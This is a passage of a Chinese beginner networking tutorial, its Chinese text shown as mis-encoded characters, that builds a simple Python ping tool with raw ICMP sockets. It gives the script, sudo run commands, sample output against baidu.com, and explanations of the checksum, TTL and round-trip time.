class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day05_simple_ping.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šå®ç°ç®€å•çš„pingå·¥å…·</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_checksum</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è®¡ç®—ICMPæ ¡éªŒå’Œ</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        data: è¦è®¡ç®—æ ¡éªŒå’Œçš„æ•°æ®ï¼ˆbytesï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        æ ¡éªŒå’Œï¼ˆintï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">        1. å°†æ•°æ®æŒ‰16ä½åˆ†ç»„æ±‚å’Œ</span><br><span class="hljs-string">        2. å¦‚æœæœ‰è¿›ä½ï¼Œå°†è¿›ä½åŠ åˆ°ç»“æœä¸Š</span><br><span class="hljs-string">        3. å–åç å¾—åˆ°æ ¡éªŒå’Œ</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å¦‚æœæ•°æ®é•¿åº¦æ˜¯å¥‡æ•°ï¼Œè¡¥ä¸€ä¸ªå­—èŠ‚0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        data += <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br>    <span class="hljs-comment"># æŒ‰16ä½ï¼ˆ2å­—èŠ‚ï¼‰åˆ†ç»„æ±‚å’Œ</span><br>    checksum = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        <span class="hljs-comment"># å°†ä¸¤ä¸ªå­—èŠ‚ç»„åˆæˆä¸€ä¸ª16ä½æ•´æ•°</span><br>        word = (data[i] &lt;&lt; <span class="hljs-number">8</span>) + data[i + <span class="hljs-number">1</span>]<br>        checksum += word<br><br>    <span class="hljs-comment"># å¤„ç†è¿›ä½ï¼šå°†é«˜16ä½åŠ åˆ°ä½16ä½</span><br>    <span class="hljs-keyword">while</span> checksum &gt;&gt; <span class="hljs-number">16</span>:<br>        checksum = (checksum &amp; <span class="hljs-number">0xFFFF</span>) + (checksum &gt;&gt; <span class="hljs-number">16</span>)<br><br>    <span class="hljs-comment"># å–åç </span><br>    checksum = ~checksum &amp; <span class="hljs-number">0xFFFF</span><br><br>    <span class="hljs-keyword">return</span> checksum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_icmp_packet</span>(<span class="hljs-params">packet_id, sequence</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ›å»ºICMP Echo Requestæ•°æ®åŒ…</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        packet_id: æ ‡è¯†ç¬¦ï¼ˆç”¨äºåŒºåˆ†ä¸åŒçš„pingè¿›ç¨‹ï¼‰</span><br><span class="hljs-string">        sequence: åºåˆ—å·ï¼ˆæ ‡è¯†ç¬¬å‡ ä¸ªåŒ…ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        å®Œæ•´çš„ICMPæ•°æ®åŒ…ï¼ˆbytesï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ICMPåŒ…ç»“æ„ï¼š</span><br><span class="hljs-string">        [ç±»å‹(1å­—èŠ‚) | ä»£ç (1å­—èŠ‚) | æ ¡éªŒå’Œ(2å­—èŠ‚) |</span><br><span class="hljs-string">         æ ‡è¯†ç¬¦(2å­—èŠ‚) | åºåˆ—å·(2å­—èŠ‚) | æ•°æ®]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># ICMPç±»å‹ï¼š8=Echo Request</span><br>    icmp_type = <span class="hljs-number">8</span><br>    <span class="hljs-comment"># ICMPä»£ç ï¼š0</span><br>    icmp_code = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># æ ¡éªŒå’Œï¼šå…ˆè®¾ä¸º0ï¼Œç¨åè®¡ç®—</span><br>    icmp_checksum = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># æ‰“åŒ…ICMPå¤´éƒ¨ï¼ˆä¸åŒ…æ‹¬æ ¡éªŒå’Œï¼‰</span><br>    <span class="hljs-comment"># ! = ç½‘ç»œå­—èŠ‚åºï¼ˆå¤§ç«¯ï¼‰</span><br>    <span class="hljs-comment"># B = unsigned char (1å­—èŠ‚)</span><br>    <span class="hljs-comment"># H = unsigned short (2å­—èŠ‚)</span><br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br><br>    <span class="hljs-comment"># æ•°æ®éƒ¨åˆ†ï¼šå‘é€æ—¶é—´æˆ³ï¼ˆç”¨äºè®¡ç®—RTTï¼‰</span><br>    data = struct.pack(<span class="hljs-string">&#x27;!d&#x27;</span>, time.time())<br><br>    <span class="hljs-comment"># è®¡ç®—æ ¡éªŒå’Œ</span><br>    icmp_checksum = calculate_checksum(header + data)<br><br>    <span class="hljs-comment"># é‡æ–°æ‰“åŒ…ï¼ŒåŠ å…¥æ­£ç¡®çš„æ ¡éªŒå’Œ</span><br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br><br>    <span class="hljs-keyword">return</span> header + data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_icmp_reply</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è§£æICMP Echo Replyæ•°æ®åŒ…</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        packet: æ¥æ”¶åˆ°çš„æ•°æ®åŒ…</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        (icmp_type, icmp_code, icmp_id, icmp_seq, send_time)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># IPå¤´éƒ¨é€šå¸¸æ˜¯20å­—èŠ‚ï¼ŒICMPä»ç¬¬21å­—èŠ‚å¼€å§‹</span><br>    icmp_header = packet[<span class="hljs-number">20</span>:<span class="hljs-number">28</span>]<br><br>    <span class="hljs-comment"># è§£æICMPå¤´éƒ¨</span><br>    icmp_type, icmp_code, checksum, packet_id, sequence = struct.unpack(<br>        <span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_header<br>    )<br><br>    <span class="hljs-comment"># è§£ææ•°æ®éƒ¨åˆ†çš„æ—¶é—´æˆ³</span><br>    send_time = struct.unpack(<span class="hljs-string">&#x27;!d&#x27;</span>, packet[<span class="hljs-number">28</span>:<span class="hljs-number">36</span>])[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">return</span> icmp_type, icmp_code, packet_id, sequence, send_time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>(<span class="hljs-params">host, count=<span class="hljs-number">4</span>, timeout=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    pingæŒ‡å®šä¸»æœº</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        host: ç›®æ ‡ä¸»æœºåæˆ–IPåœ°å€</span><br><span class="hljs-string">        count: pingçš„æ¬¡æ•°</span><br><span class="hljs-string">        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        ç»Ÿè®¡ä¿¡æ¯å­—å…¸</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;PING <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è§£æä¸»æœºåä¸ºIPåœ°å€</span><br>    <span class="hljs-keyword">try</span>:<br>        dest_ip = socket.gethostbyname(host)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç›®æ ‡IP: <span class="hljs-subst">&#123;dest_ip&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-keyword">except</span> socket.gaierror:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ æ— æ³•è§£æä¸»æœºå: <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># åˆ›å»ºåŸå§‹socketï¼ˆéœ€è¦rootæƒé™ï¼‰</span><br>    <span class="hljs-keyword">try</span>:<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>        sock.settimeout(timeout)<br>    <span class="hljs-keyword">except</span> PermissionError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œæ­¤ç¨‹åº&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ Linux/Mac: sudo python day05_simple_ping.py&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ Windows: ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># ç»Ÿè®¡ä¿¡æ¯</span><br>    packet_id = <span class="hljs-number">12345</span>  <span class="hljs-comment"># å¯ä»¥ç”¨è¿›ç¨‹ID</span><br>    sent = <span class="hljs-number">0</span><br>    received = <span class="hljs-number">0</span><br>    rtt_list = []<br><br>    <span class="hljs-comment"># å‘é€pingåŒ…</span><br>    <span class="hljs-keyword">for</span> seq <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># åˆ›å»ºICMPåŒ…</span><br>            packet = create_icmp_packet(packet_id, seq)<br><br>            <span class="hljs-comment"># å‘é€</span><br>            send_time = time.time()<br>            sock.sendto(packet, (dest_ip, <span class="hljs-number">0</span>))<br>            sent += <span class="hljs-number">1</span><br><br>            <span class="hljs-comment"># æ¥æ”¶å›å¤</span><br>            <span class="hljs-keyword">try</span>:<br>                reply_packet, addr = sock.recvfrom(<span class="hljs-number">1024</span>)<br>                recv_time = time.time()<br><br>                <span class="hljs-comment"># è§£æå›å¤</span><br>                icmp_type, icmp_code, reply_id, reply_seq, packet_send_time = \<br>                    parse_icmp_reply(reply_packet)<br><br>                <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ˜¯æˆ‘ä»¬çš„åŒ…çš„å›å¤</span><br>                <span class="hljs-keyword">if</span> icmp_type == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> reply_id == packet_id <span class="hljs-keyword">and</span> reply_seq == seq:<br>                    <span class="hljs-comment"># è®¡ç®—RTT</span><br>                    rtt = (recv_time - packet_send_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># è½¬æ¢ä¸ºæ¯«ç§’</span><br>                    rtt_list.append(rtt)<br>                    received += <span class="hljs-number">1</span><br><br>                    <span class="hljs-comment"># è·å–TTL</span><br>                    ttl = struct.unpack(<span class="hljs-string">&#x27;!B&#x27;</span>, reply_packet[<span class="hljs-number">8</span>:<span class="hljs-number">9</span>])[<span class="hljs-number">0</span>]<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… æ¥è‡ª <span class="hljs-subst">&#123;dest_ip&#125;</span>: icmp_seq=<span class="hljs-subst">&#123;seq&#125;</span> ttl=<span class="hljs-subst">&#123;ttl&#125;</span> &quot;</span><br>                          <span class="hljs-string">f&quot;time=<span class="hljs-subst">&#123;rtt:<span class="hljs-number">.2</span>f&#125;</span> ms&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âš ï¸  æ”¶åˆ°æ„å¤–çš„ICMPåŒ… type=<span class="hljs-subst">&#123;icmp_type&#125;</span>&quot;</span>)<br><br>            <span class="hljs-keyword">except</span> socket.timeout:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;â±ï¸  icmp_seq=<span class="hljs-subst">&#123;seq&#125;</span> è¯·æ±‚è¶…æ—¶&quot;</span>)<br><br>            <span class="hljs-comment"># ç­‰å¾…1ç§’å†å‘é€ä¸‹ä¸€ä¸ªåŒ…</span><br>            <span class="hljs-keyword">if</span> seq &lt; count - <span class="hljs-number">1</span>:<br>                time.sleep(<span class="hljs-number">1</span>)<br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ å‘é€å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    sock.close()<br><br>    <span class="hljs-comment"># æ‰“å°ç»Ÿè®¡ä¿¡æ¯</span><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“Š <span class="hljs-subst">&#123;host&#125;</span> pingç»Ÿè®¡ä¿¡æ¯:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   å‘é€: <span class="hljs-subst">&#123;sent&#125;</span> ä¸ªåŒ…&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æ¥æ”¶: <span class="hljs-subst">&#123;received&#125;</span> ä¸ªåŒ…&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ä¸¢å¤±: <span class="hljs-subst">&#123;sent - received&#125;</span> ä¸ªåŒ… (<span class="hljs-subst">&#123;((sent-received)/sent*<span class="hljs-number">100</span>):<span class="hljs-number">.1</span>f&#125;</span>% loss)&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> rtt_list:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   RTT: æœ€å°=<span class="hljs-subst">&#123;<span class="hljs-built_in">min</span>(rtt_list):<span class="hljs-number">.2</span>f&#125;</span>ms, &quot;</span><br>              <span class="hljs-string">f&quot;å¹³å‡=<span class="hljs-subst">&#123;<span class="hljs-built_in">sum</span>(rtt_list)/<span class="hljs-built_in">len</span>(rtt_list):<span class="hljs-number">.2</span>f&#125;</span>ms, &quot;</span><br>              <span class="hljs-string">f&quot;æœ€å¤§=<span class="hljs-subst">&#123;<span class="hljs-built_in">max</span>(rtt_list):<span class="hljs-number">.2</span>f&#125;</span>ms&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">60</span>)<br><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&#x27;sent&#x27;</span>: sent,<br>        <span class="hljs-string">&#x27;received&#x27;</span>: received,<br>        <span class="hljs-string">&#x27;rtt_list&#x27;</span>: rtt_list<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç®€æ˜“Pingå·¥å…·&quot;</span>.center(<span class="hljs-number">60</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è·å–ç›®æ ‡ä¸»æœº</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>        host = sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦pingçš„ä¸»æœºåæˆ–IP: &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> host:<br>            host = <span class="hljs-string">&quot;baidu.com&quot;</span>  <span class="hljs-comment"># é»˜è®¤</span><br><br>    <span class="hljs-comment"># æ‰§è¡Œping</span><br>    result = ping(host, count=<span class="hljs-number">4</span>, timeout=<span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">if</span> result <span class="hljs-keyword">and</span> result[<span class="hljs-string">&#x27;received&#x27;</span>] &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ‰ Pingå®Œæˆï¼&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ Pingå¤±è´¥æˆ–ç½‘ç»œä¸å¯è¾¾&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Macï¼ˆéœ€è¦rootæƒé™ï¼‰</span><br><span class="hljs-built_in">sudo</span> python code/day05/day05_simple_ping.py baidu.com<br><br><span class="hljs-comment"># Windowsï¼ˆä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰</span><br>python code\day05\day05_simple_ping.py baidu.com<br><br><span class="hljs-comment"># ä¸å¸¦å‚æ•°è¿è¡Œï¼Œä¼šæç¤ºè¾“å…¥ä¸»æœºå</span><br><span class="hljs-built_in">sudo</span> python code/day05/day05_simple_ping.py<br></code></pre></td></tr></table></figure><h3 id="é¢„æœŸè¾“å‡º">é¢„æœŸè¾“å‡º</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">============================================================<br>                       ç®€æ˜“Pingå·¥å…·<br>============================================================<br><br>PING baidu.com<br><br><span class="hljs-section">ç›®æ ‡IP: 220.181.38.148</span><br><span class="hljs-section">------------------------------------------------------------</span><br>âœ… æ¥è‡ª 220.181.38.148: icmp<span class="hljs-emphasis">_seq=0 ttl=52 time=28.50 ms</span><br><span class="hljs-emphasis">âœ… æ¥è‡ª 220.181.38.148: icmp_seq=1 ttl=52 time=27.82 ms</span><br><span class="hljs-emphasis">âœ… æ¥è‡ª 220.181.38.148: icmp_seq=2 ttl=52 time=28.15 ms</span><br><span class="hljs-emphasis">âœ… æ¥è‡ª 220.181.38.148: icmp_</span>seq=3 ttl=52 time=29.20 ms<br><br><span class="hljs-code">------------------------------------------------------------</span><br><span class="hljs-code">ğŸ“Š baidu.com pingç»Ÿè®¡ä¿¡æ¯:</span><br><span class="hljs-code">   å‘é€: 4 ä¸ªåŒ…</span><br><span class="hljs-code">   æ¥æ”¶: 4 ä¸ªåŒ…</span><br><span class="hljs-code">   ä¸¢å¤±: 0 ä¸ªåŒ… (0.0% loss)</span><br><span class="hljs-code">   RTT: æœ€å°=27.82ms, å¹³å‡=28.42ms, æœ€å¤§=29.20ms</span><br><span class="hljs-code">------------------------------------------------------------</span><br><br>ğŸ‰ Pingå®Œæˆï¼<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ä»£ç è¯¦è§£">ğŸ” ä»£ç è¯¦è§£</h2><h3 id="1-ä¸ºä»€ä¹ˆéœ€è¦rootæƒé™ï¼Ÿ">1. ä¸ºä»€ä¹ˆéœ€è¦rootæƒé™ï¼Ÿ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br></code></pre></td></tr></table></figure><p><strong>åŸå§‹å¥—æ¥å­—</strong>ï¼ˆSOCK_RAWï¼‰å¯ä»¥æ„é€ ä»»æ„çš„IPåŒ…ï¼Œè¿™æ˜¯ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ“ä½œç³»ç»Ÿè¦æ±‚å¿…é¡»æœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½ä½¿ç”¨ã€‚</p><h3 id="2-æ ¡éªŒå’Œçš„è®¡ç®—">2. æ ¡éªŒå’Œçš„è®¡ç®—</h3><p>æ ¡éªŒå’Œç”¨äºæ£€æµ‹æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦æŸåï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åŸç†ï¼š</span><br><span class="hljs-number">1.</span> å°†æ•°æ®æŒ‰<span class="hljs-number">16</span>ä½åˆ†ç»„<br><span class="hljs-number">2.</span> æ‰€æœ‰åˆ†ç»„ç›¸åŠ <br><span class="hljs-number">3.</span> å¦‚æœæœ‰è¿›ä½ï¼ŒåŠ åˆ°ä½<span class="hljs-number">16</span>ä½<br><span class="hljs-number">4.</span> å¯¹ç»“æœå–åç <br><br><span class="hljs-comment"># æ¥æ”¶æ–¹éªŒè¯ï¼š</span><br><span class="hljs-number">1.</span> å¯¹æ”¶åˆ°çš„æ•°æ®ï¼ˆåŒ…æ‹¬æ ¡éªŒå’Œï¼‰åšåŒæ ·çš„è®¡ç®—<br><span class="hljs-number">2.</span> å¦‚æœç»“æœæ˜¯<span class="hljs-number">0xFFFF</span>ï¼Œè¯´æ˜æ•°æ®å®Œæ•´<br><span class="hljs-number">3.</span> å¦åˆ™è¯´æ˜æ•°æ®æŸå<br></code></pre></td></tr></table></figure><h3 id="3-TTLçš„å«ä¹‰">3. TTLçš„å«ä¹‰</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">TTL (Time To Live) <span class="hljs-operator">=</span> ç”Ÿå­˜æ—¶é—´<br><br>åˆå§‹å€¼ï¼šé€šå¸¸æ˜¯<span class="hljs-number">64</span>æˆ–<span class="hljs-number">128</span><br>æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼šTTL -<span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>å½“TTL <span class="hljs-operator">=</span> <span class="hljs-number">0</span>ï¼šè·¯ç”±å™¨ä¸¢å¼ƒè¯¥åŒ…ï¼Œè¿”å›è¶…æ—¶é”™è¯¯<br><br>ä½œç”¨ï¼šé˜²æ­¢æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­æ— é™å¾ªç¯<br></code></pre></td></tr></table></figure><h3 id="4-æ—¶é—´æˆ³çš„ä½œç”¨">4. æ—¶é—´æˆ³çš„ä½œç”¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å‘é€æ—¶åœ¨æ•°æ®éƒ¨åˆ†åµŒå…¥æ—¶é—´æˆ³</span><br>data = struct.pack(<span class="hljs-string">&#x27;!d&#x27;</span>, time.time())<br><br><span class="hljs-comment"># æ”¶åˆ°å›å¤æ—¶ï¼Œè§£ææ—¶é—´æˆ³</span><br>send_time = struct.unpack(<span class="hljs-string">&#x27;!d&#x27;</span>, packet[<span class="hljs-number">28</span>:<span class="hljs-number">36</span>])[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># è®¡ç®—RTT</span><br>rtt = (recv_time - send_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># æ¯«ç§’</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… pingç”¨äºæµ‹è¯•ç½‘ç»œè¿é€šæ€§å’Œå»¶è¿Ÿ</li><li>âœ… pingåŸºäºICMPåè®®ï¼ˆç±»å‹8è¯·æ±‚ï¼Œç±»å‹0å›å¤ï¼‰</li><li>âœ… RTTæ˜¯æ•°æ®åŒ…å¾€è¿”çš„æ€»æ—¶é—´</li><li>âœ… TTLè¡¨ç¤ºæ•°æ®åŒ…è¿˜èƒ½ç»è¿‡å¤šå°‘ä¸ªè·¯ç”±å™¨</li><li>âœ… å®ç°pingéœ€è¦ä½¿ç”¨åŸå§‹å¥—æ¥å­—</li></ol><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><table><thead><tr><th>æ¦‚å¿µ</th><th>å«ä¹‰</th><th>å•ä½</th></tr></thead><tbody><tr><td>RTT</td><td>å¾€è¿”æ—¶é—´</td><td>æ¯«ç§’(ms)</td></tr><tr><td>TTL</td><td>ç”Ÿå­˜æ—¶é—´</td><td>è·³æ•°(hops)</td></tr><tr><td>ä¸¢åŒ…ç‡</td><td>ä¸¢å¤±çš„åŒ…å æ€»æ•°çš„æ¯”ä¾‹</td><td>ç™¾åˆ†æ¯”(%)</td></tr><tr><td>ICMP</td><td>ç½‘ç»œæ§åˆ¶æ¶ˆæ¯åè®®</td><td>-</td></tr></tbody></table><h3 id="pingå‘½ä»¤é€ŸæŸ¥">pingå‘½ä»¤é€ŸæŸ¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span 